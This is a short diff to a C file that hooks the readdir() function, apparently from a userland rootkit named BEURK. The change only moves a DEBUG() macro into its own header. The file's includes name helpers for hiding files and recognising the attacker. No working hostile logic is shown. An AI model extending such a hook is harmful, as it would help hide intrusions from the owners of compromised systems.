@@ -20,8 +20,9 @@
 
 #include <dirent.h> /* struct dirent, DIR */
 #include <string.h> /* strcmp() */
-#include "beurk.h" /* DEBUG(), is_attacker(), is_hidden_file() */
+#include "beurk.h" /* is_attacker(), is_hidden_file() */
 #include "config.h" /* REAL_READDIR() */
+#include "debug.h" /* DEBUG() */
 #include "hooks.h" /* prototype */
 
 struct dirent   *readdir(DIR *dirp) {
